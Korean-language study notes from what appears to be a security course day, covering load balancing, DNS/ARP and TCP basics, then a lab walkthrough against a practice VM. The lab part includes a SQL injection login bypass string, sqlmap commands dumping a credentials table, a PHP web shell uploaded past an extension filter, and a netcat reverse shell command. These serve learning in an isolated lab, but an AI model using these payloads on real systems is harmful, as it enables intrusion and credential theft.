# DAY_5

사용자가 시스템에 요청해서 시스템을 사용하려고 하는데 요청하는 사용자가 많아지면 과부화 생김  
그래서 사용자와 시스템 사이에 L4를 만들어 서비스를 분산하거나 애플리케이션 영역에서 L.B 요청 분산  
L4, LB는 결합 허용이 아님!  
DNS : ~~~ 쿼리 => 마스터가 있고 대체할 수 있는 세컨더리 있음  
이것처럼 LB master와 LB slaver로!  

### 하둡
누군가 요청하면 데이터 노드 쪽에 데이터 저장하거나 분산된 데이터 처리하는 거 필요 -> **네임노드** : 세컨더리 둠, 이중화 되어있다!  
데이터 노드:  

### 시험인감!!? [웹 브라우저에서 구글 사이트 접속 과정]
웹 브라우저에 google.com을 쳤을 때 페이지가 나오는 세부 흐름  
- keyword
   - DNS 스콜  
   - TCP/IP step, Gate way

``` 
1. goolecom의 IP가 뭐지?  
 **(1-1) 메모리 내에 DNS Cache를 먼저 살핀다. :ipconfig/flushdns  
   (1-2) /etc/hosts 본다.**  
    > C:\Windows\System32\drivers\etc의 host 파일에 DNS 적어놓을 수 있음   
    > 그러면 DNS 서버를 참조하는게 아니라 hosts 파일을 참조해서 한다.   

  사용자가 입력한 구글 닷컴의 ip를 알아야 함  
  * DNS 서비스에게 google.com의 IP가 무엇이지?  
    => DNS 서버에게 Query를 해야한다.(168.126.63.1)  
      
  * 실제 통신은(low level 말하는 것) MAC 주소로 통신을 한다.  
    => DNS의 IP주소를 MAC주소로 변환해서 알아야 한다. //DNS : 도메인 -> ip  
      (ARP 프로토콜로 MAC 주소를 알아온다.)    //ARP: ip -> MAC  
```
 
      #### cmd
      > **arp -a**   
      > ip 주소에 대한 MAC 주소(물리적 주소) 나옴  
      그러나 DNS에 대한 ip 주소 없음  
      
      > ipconfig  
      > 서브넷 마스크는 무슨 의미?  
      >  - 뒷자리만 다르면 하나의 네트워크에 있다.
      
      기본적으로 통신은 IP로 진행되는데 실제 통신은 MAC주소로 진행된다.  
      IP를 MAC주소로 바꾸는게 arp다.  
      
      - 게이트를 통해 DNS 서버로 가야함!!!  
      - 서브넷 마스크나 게이트웨이 없으면 어떻게 되는지, MAC주소가 무슨 역할 하는지  

네트워크는 계층적으로 통신함(OSI 7 Layer, TCP/IP 4 Layer)  
![layer](https://user-images.githubusercontent.com/50771111/88609141-5cf2c880-d0be-11ea-8611-cdb2d97571a1.png)

   **subnet mask**     
    (1) 같은 네트워크 영역 => ARP 테이블의 MAC주소로 통신.  
    (2) 다른 네트워크 영역 => 게이트웨이(IP)로 데이터를 보낸다.  
        (게이트웨이의 IP 주소에 대한 MAC 주소로 데이터를 보낸다.)
   
 **====> DNS 쿼리가 이루어졌다.(172.217.161.174)**


```
2. 172.217.161.174 웹서버(구글 웹서버)에 연결을 해야 한다. (TCP)
   * 웹서버는 TCP기반의 HTTP 프로토콜을 이용하고,  
     기본 포트 80 이다. //포트: 프로그램 구분 번호  
     - TCP는 연결 지향 통신(연결 된 것 처럼 쓰겠다.)   
   2-1) TCP 연결을 하기 위해 TCP 3-way handshaking.  

3. (연결이 된 후에) HTTP 요청 (GET...)  

4. HTTP Response(응답) 받고 화면에 데이터를 표시.  

5. 연결을 해제.  
```

#### 준비
> vm에 Web 깔기, kali linux 깔기

#### cmd
> ifconfig // ip 확인  

ping: icmp프로토콜, 네트워크 상태를 모니터링 하고 확인하기 위해 사용하는 프로토콜
> ping www.google.com
> ping www.naver.com
특정 서버가 살아있는지 알기 위해 ping 날렸는데 응답 있으면 살아 있는 것!  
그러나 응답이 없다고해서 죽었다고 할 수는 X, 그냥 서버가 응답 안한거 일 수도 있어서!!
> traceroute www.naver.com
> 하려고 노력은 함!!

> ping 쓰면 살았는지 죽었는지 알 수 있음!

> fping : kali linux가 사용하는 명령어  
> fping -g 10.0.2.0/24  
> 몇 개 alive 한게 있음. 10.0.2.6는 나!  
> 1은 게이트 웨이이고 2,3,3 중에 

#### 포트 스캐닝
> nmap -sT -v 10.0.2.2-4 (alive한 것들 어떤 포트 사용하고 있는지 확인)  

> telnet 10.0.2.4 80(포트번호)  

> kali -> application -> 파이어 폭스 -> 주소창에 10.0.2.4 입력  
>   ==> My Awesome Photoblog 화면 출력!!  

#### 디렉토리 리스팅
> 위에서 사진에서 마우스 우클릭 -> copy Image Location -> 주소창에 입력 -> 뒤에 이미지명 지우기  
>   => Index 파일 리스팅 됨

### [SQL Injection]
```
ID와 PW를 입력하면
id : ' OR '1' = '1--
select count(*) from user_id where id=’' OR '1' = '1’ -- and Pw=’hi’
```
- kali shell  
> sqlmap -u "http://10.0.2.9/cat.php?id=1"  //sql injection에 취약한 URL 파라미터로 던져봄

```
sqlmap -u "http://10.0.2.9/cat.php?id=1"  

sqlmap -u "http://10.0.2.9/cat.php?id=1" --current-db  
    > photoblog 확인  
    
```

포토DB의 테이블 떠보기
> sqlmap -u "http://10.0.2.9/cat.php?id=1" -D photoblog --dump  
>   조금 위로 올려보면 id/pw 나와있는거 볼 수 있음

hash 함수: 고정된 길이. 다른 입력값 -> 다른 출력값, 출력값으로 입력값 예측 불가  
근데 어떻게 풀었지!?!  
   - 중국에서 해쉬값 풀어놓은 테이블 O -> 레인보우 테이블 
   
**id/pw로 로그인 가능한거 확인함!!**

#### shell 코드 올리기
1.  shell 코드 만들기
   > vi hack.php
   > ---------------------
   > <?php
   > system($_GET['cmd']);
   > ?>
   > --------------------
   > ==> php 파일 안올라감 
   
   > 해결법: php 파일 확장자명 대문자로 바꾸기  
   > mv hack.php hack.PHP  
   > 그리고 페이지에서 add 하면 됨!!
   
#### reverse telnet
클라언트가 접속해서 서버에 명령을 보내 실행하는거지  
클라이언트가 접속해서 서버가 명령 보내 실행하는거 X  

만약 방화벽 안에 우리가 장악한 서버가 있으면! 리버스 telnet을 이용해서 제어

kali
```
> nc -lvnp 7000 실행
> lisen 상태

> 홈페이지 주소 창 뒤에 cmd=nc 10.0.2.6(칼리 IP) 7000  -e /bin/sh
>  shell 창에서 connect 된 거 볼 수 있음

